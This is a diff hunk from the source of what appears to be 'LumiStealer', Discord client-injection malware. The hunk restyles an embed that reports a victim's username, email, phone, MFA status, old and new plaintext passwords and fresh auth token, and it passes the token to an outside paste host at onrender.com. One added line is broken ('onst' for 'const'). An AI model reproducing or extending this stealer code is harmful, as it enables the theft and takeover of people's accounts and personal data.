@@ -654,56 +654,56 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         return true
       }
 
-      const embedNewPasswd = {
-        title: "Password Changed - LumiStealer",
-        color: 0x5a0998,
-        fields: [
-          {
-            name: "Username",
+onst embedNewPasswd = {
+    title: "Password Changed - LumiStealer",
+    color: 0x5a0998,
+    fields: [
+        {
+            name: "<:friends:1249813642879303711> User",
             value: "`"+user.username+"`",
             inline: true
-          },
-          {
-            name: "ID",
+        },
+        {
+            name: "<:aaaaaaa:1249820962463944745> ID",
             value: "`"+user.id+"`",
             inline: true
-          },
-          {
-            name: "Nitro",
+        },
+        {
+            name: "<:zanybooster:1248262436482711733> Nitro",
             value: GetNitro(Nitro),
             inline: true
-          },
-          {
-            name: "Email",
+        },
+        {
+            name: "<:emoji_54:1249821065236975686> Email",
             value: "`"+user.email+"`",
             inline: true
-          },
-          {
-            name: "Phone",
+        },
+        {
+            name: "<:c_ip2:1249821011898269706> Phone",
             value: "`"+user.phone+"`",
             inline: true
-          },
-          {
-            name: "Badges",
+        },
+        {
+            name: "<:badge:1249821267104759959> Badges",
             value: GetBadges(user.public_flags),
             inline: true
-          },
-          {
+        },
+        {
             name: "Old Password",
             value: "`"+old_passwd+"`",
             inline: true
-          },
-          {
+        },
+        {
             name: "New Password",
             value: "`"+new_passwd+"`",
             inline: true
-          },
-          {
-            name: "MFA",
+        },
+        {
+            name: "<:jptstaff1:1235646259839107193> MFA",
             value: GetA2F(user.mfa_enabled),
             inline: true
-          },
-          {
+        },
+        {
             name: "New Token",
             value: "||"+new_token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+new_token+")",
             inline: true
